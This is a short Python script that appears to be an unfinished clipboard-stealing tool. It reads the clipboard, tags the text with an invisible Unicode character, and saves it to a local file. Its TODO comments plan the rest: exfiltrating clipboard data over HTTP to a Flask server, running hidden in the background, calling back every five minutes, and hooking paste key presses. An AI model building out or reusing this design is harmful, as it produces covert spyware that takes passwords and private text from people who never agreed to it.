import os
import subprocess
import pyperclip
import random

def main():
    #clipboard_data = os.system("Get-Clipboard")
    #print(clipboard_data)
    #subprocess.call(['systeminfo'])
    #subprocess.call(['Get-Clipboard'])
    #print('k')
    #ansible

    #ᅟ--
    #there is an invisible character next to that hashtag

    # grabs the current clipboard

    invisible_character = 'ᅟ'
    #random_number = random.randrange(0,len(pyperclip.paste()))
    clipboard_info = pyperclip.paste()
    print(clipboard_info + " this is the first call")
    #print(clipboard_info + clipboard_info[random_number])

    pyperclip.copy(clipboard_info + invisible_character)
    print(pyperclip.paste())

    #copy - copies whatever test to the clipboard
    #paste, pastes text from clipboard into where

    testFile = open("myfile.txt", "w")
    testFile.write(clipboard_info)
    testFile.close()

    #copies the text we want to that clipboard
    #pyperclip.copy("This should work.")

    #paste gets it and copy copies it to clipboard
    #x = pyperclip.paste()
    #print(x)

    #TODO: SEE BELOW
    #take what is in clipboard and save it in file, exfil it somewhere. http request and set up server side too.
    #find a way to have it always runin background
    #callback every five minutes. key listers for ctrl v or paste. copy send it back and read to a file. update clipbaord.
    #python and window sys calls.
    #windows clipboard sys calls. - pull functionality off of it. - windows will be in C probably.
    #request and flask. for python https. !!!s
main()